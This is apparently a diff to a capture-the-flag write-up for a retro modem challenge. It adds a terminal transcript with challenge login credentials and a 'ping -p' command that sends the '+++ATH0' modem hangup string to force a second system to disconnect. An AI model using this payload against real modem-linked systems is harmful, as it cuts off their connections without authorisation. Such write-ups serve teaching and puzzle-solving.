@@ -81,9 +81,52 @@ Meanwhile, we examine the [recording](files/recording.wav). It contains audio of
 
 We try dialing the number through the serial port, and get a `BUSY` signal. The second system is actively connected. How do we get it to hang up and answer a call from us?
 
-[my_note.txt](files/my_note.txt) suggests we can use a [ping-of-death](https://en.wikipedia.org/wiki/Ping_of_death) from the first server, with a payload of `+++ATH0`, to cause a disconnection at the second server.
+[my_note.txt](files/my_note.txt) suggests we can use a [ping-of-death](https://en.wikipedia.org/wiki/Ping_of_death) from the first server, with a payload of `+++ATH0` in hex `2B2B2B415448300D0A`, to cause a disconnection at the second server.
 
 ![Ping of Death and Connection to Second Server](images/ping-of-death-login.png)
+
+Sequence of commands used reaching the second server:
+
+```
+ATD 2825550194
+CONNECT
+ _     _____ _____ _____ _   _
+| |   |  _  |  __ \_   _| \ | |
+| |   | | | | |  \/ | | |  \| |
+| |   | | | | | __  | | | . ` |
+| |___\ \_/ / |_\ \_| |_| |\  |
+\_____/\___/ \____/\___/\_| \_/
+
+Username: hax
+Password: hunter2
+
+fakesh-4.4$ ping -p 2B2B2B415448300D0A 93.184.216.34
+PATTERN: 0x2b2b2b415448300d0a
+PING 93.184.216.34 (93.184.216.34) 56(84) bytes of data.
+
+--- 93.184.216.34 ping statistics ---
+1 packets transmitted, 0 received, 100% packet loss, time 0ms
+
+fakesh-4.4$ exit
+NO CARRIER
+ATD 4905550175;
+CONNECT
+*   *   . *  *    * .   *   * . *   *  .
+    .  *   *   .    * .    . *      .  *
+ *   +------------------------------+
+   . |            SATNET            |   *
+     +------------------------------+ .
+  .  |    UNAUTHORIZED ACCESS IS    |
+     |     STRICTLY PROHIBITED      |
+.    +------------------------------+   .
+         .             .
+                                  .
+
+Setting up - this will take a while...
+
+LOGIN
+Username:
+```
 
 Now we need credentials for the second system. Perhaps they can be found in the modem [recording](files/recording.wav)? We [listen](https://www.youtube.com/watch?v=abapFJN6glo) and look at the spectrograph of the recording, and see strong evidence we're dealing with a [300 baud modem signal](https://www.youtube.com/watch?v=1Pmxkt9mYgM), either [Bell 103](https://en.wikipedia.org/wiki/Bell_103_modem) or [ITU-T Recommendation V.21](https://www.itu.int/rec/T-REC-V.21/en).
 
